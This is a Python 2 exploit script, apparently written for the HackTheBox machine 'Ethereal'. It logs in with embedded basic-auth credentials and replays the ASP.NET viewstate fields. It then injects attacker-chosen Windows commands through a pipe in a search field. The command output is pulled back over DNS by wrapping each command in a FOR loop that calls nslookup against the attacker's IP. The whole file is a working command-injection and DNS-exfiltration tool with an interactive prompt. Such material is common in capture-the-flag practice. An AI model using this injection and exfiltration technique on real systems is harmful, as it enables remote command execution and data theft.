#!/usr/bin/python
import requests
from bs4 import BeautifulSoup
import re
import json
import urllib
import urllib2 
#using urllib becoz json.dumps is not urlencoding

htb=raw_input("enter the HTB ip:>  ")

# edit hostfile for ethereal.htb
headers= {'Host': 'ethereal.htb:8080','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0','Authorization': 'Basic QWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h'}
eth="http://ethereal.htb:8080/"
r=requests.post(url=eth,headers=headers)
src=BeautifulSoup(r.content,"html.parser")
lst=src.findAll("input")

#print lst
print ""
#for i in lst:
# if i.attrs['type']=="hidden":
#print lst[0].attrs['name']+"  ====   "+lst[0].attrs['value']
vs=lst[0].attrs['value']

#
#print lst[1].attrs['name']+"  ====   "+lst[1].attrs['value']
vsg=lst[1].attrs['value']

# 
#print lst[2].attrs['name']+"  ====   "+lst[2].attrs['value']
ev=lst[2].attrs['value']

#for i in lst:
# print i.attrs
while True:
    print ""
    cmd=raw_input("enter payload (e.g ping <your ip>) ==  ")
    print "running ====> "+cmd
    cmd="127.0.0.1|"+"""( FOR /F "tokens=1-26" %a IN ('"""+cmd+"""') DO ( nslookup D%a.D%b.D%c.D%d.D%e.D%f.D%g.D%h.D%i.D%j.D%k.D%l.D%m.D%n.D%o.D%p.D%q.D%r.D%s.D%t.D%u.D%v.D%w.D%x.D%y.D%z. """+htb+") )"

    #

    data={ '__VIEWSTATE':vs,      '__VIEWSTATEGENERATOR':vsg,  '__EVENTVALIDATION':ev,      'search':cmd,   'ctl02':''}
    p=urllib.urlencode({ '__VIEWSTATE':vs,      '__VIEWSTATEGENERATOR':vsg,  '__EVENTVALIDATION':ev,      'search':cmd,   'ctl02':''})
    headers={'Authorization':'Basic QWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h'}
    r1=urllib2.Request(eth,p,headers)
    rq=urllib2.urlopen(r1)
    src=BeautifulSoup(rq.read(),"html.parser")
    lst=src.findAll("input")
# scraping viewstate
    vs=lst[0].attrs['value']
    vsg=lst[1].attrs['value']
    ev=lst[2].attrs['value']
#checking errors
    chk=src.find("h2")
    if chk.get_text()=="Connection to host successful":
      print "!..payload command success..!"
    else:
      print "??? command not executed. ???"
 

